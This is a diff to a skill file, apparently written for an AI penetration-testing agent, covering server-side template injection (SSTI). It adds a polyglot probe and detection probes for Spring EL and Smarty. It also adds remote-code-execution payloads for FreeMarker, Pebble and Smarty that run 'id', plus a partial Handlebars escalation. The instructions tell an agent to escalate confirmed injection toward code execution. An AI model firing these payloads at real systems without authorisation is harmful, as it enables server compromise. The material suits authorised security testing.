@@ -2,6 +2,8 @@
 name: attack-ssti
 description: Apply when user input is rendered through a server-side template engine (search, mail, report, or page-render parameter), to detect and, if confirmed, escalate template injection toward remote code execution.
 metadata:
+  acordia:
+    family: web-attack
   cyberstrike:
     source: .cyberstrike/skill/attack-ssti/SKILL.md
     commit: 359655518
@@ -40,6 +42,9 @@ ${7*7}            → 49 (FreeMarker, Velocity, EL)
 <%= 7*7 %>        → 49 (ERB, JSP)
 #{7*7}            → 49 (Thymeleaf)
 {{7*'7'}}         → 7777777 (Jinja2 string multiplication)
+${{<%[%'"}}%\.    → polyglot; renders or errors on any engine in the set
+*{7*7}            → 49 (Spring EL selection)
+{7*7}             → 49 (Smarty)
 ```
 
 ### Phase 3: Engine Fingerprinting
@@ -75,6 +80,26 @@ ${"freemarker.template.utility.Execute"?new()("id")}
 ```
 <%= `id` %>
 <%= system('id') %>
+```
+
+**FreeMarker (Java) — assign variant:**
+```
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+```
+
+**Pebble (Java):**
+```
+{% set cmd='id' %}{% set bytes=cmd.getClass().forName('java.lang.Runtime').getRuntime().exec(cmd) %}
+```
+
+**Smarty (PHP):**
+```
+{system('id')}
+```
+
+**Handlebars (JS):** detection `{{this}}`; escalate through the block helper —
+```
+{{#with "s" as |string|}}...{{/with}}
 ```
 
 ### Phase 5: POST-based Injection
